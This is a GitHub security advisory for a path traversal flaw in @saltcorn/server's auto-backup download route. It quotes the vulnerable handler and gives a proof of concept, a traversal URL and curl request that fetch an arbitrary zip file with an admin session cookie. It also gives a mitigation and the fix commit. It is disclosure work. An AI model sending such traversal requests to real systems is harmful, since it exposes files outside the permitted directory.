# [M] @saltcorn/server arbitrary file zip read and download when downloading auto backups

## Summary
Severity: Medium
Advisory: GHSA-277h-px4m-62q8
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-10-03
Source: https://github.com/advisories/GHSA-277h-px4m-62q8
Type: github-advisory

## Affected
- npm: `@saltcorn/server` — affected >=0 <1.0.0-beta.14

## Details
### Summary

A user with admin permission can read and download arbitrary zip files when downloading auto backups. The file name used to identify the zip file is not properly sanitized when passed to `res.download` API.

### Details

- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682

```js
router.get(
  "/auto-backup-download/:filename",
  isAdmin,
  error_catcher(async (req, res) => {
    const { filename } = req.params; // [1] source
    [...]
    if (
      !isRoot ||
      !(filename.startsWith(backup_file_prefix) && filename.endsWith(".zip")) // [2]
    ) {
      res.redirect("/admin/backup");
      return;
    }
    const auto_backup_directory = getState().getConfig("auto_backup_directory");
    res.download(path.join(auto_backup_directory, filename), filename); // [3] sink
  })
);
```

### Steps to reproduce (PoC)

- create a file with `.zip` extension under `/tmp` folder:
```
echo "secret12345" > /tmp/secret.zip
```
- log into the application as an admin user
- visit the url   `http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip`
- download the zip file and then check if the zip was indeed downloaded:
```bash
cat secret.zip
secret12345
```

 
- Alternatively send the following request to retrieve the file just created.
```bash
curl -i -X $'GET' \
    -H $'Host: localhost:3000' \
    -H $'Connection: close' \
    -b $'connect.sid=VALID_CONNECT_SID_COOKIE' \
    $'http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip'
```

**NOTE**:
To obtain a valid `connect.sid` cookie, just open the developer console while logged and retrieve the cookie value.

### Impact

Arbitrary zip files download (information disclosure).

### Recommended Mitigation

Resolve the `filename` parameter before checking if it starts with `backup_file_prefix` .

## References
- https://github.com/saltcorn/saltcorn/security/advisories/GHSA-277h-px4m-62q8
- https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192
- https://github.com/saltcorn/saltcorn
- https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682
